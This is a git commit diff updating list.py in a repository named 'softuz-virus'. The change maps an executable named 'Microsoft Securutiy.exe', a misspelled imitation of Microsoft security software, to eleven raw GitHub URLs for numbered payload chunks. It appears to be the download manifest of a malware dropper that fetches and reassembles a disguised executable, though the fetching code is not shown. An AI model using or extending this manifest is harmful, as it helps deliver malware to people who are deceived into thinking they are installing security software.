14c372afaaa3dbc764e1ba30c8a883dda425a79b
Yaxyobek0877 <106481261+Yaxyobek0877@users.noreply.github.com>
2023-12-26 14:26:20 +0500

    Update list.py

--- list.py
+++ list.py
@@ -1,1 +1,11 @@
-ls=[{"Microsoft Securutiy.exe":["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/ruf.txt"]}]
+ls = [{"Microsoft Securutiy.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_0.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_1.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_2.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_3.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_4.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_5.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_6.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_7.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_8.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_9.txt",
+                                   "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_10.txt"]}]
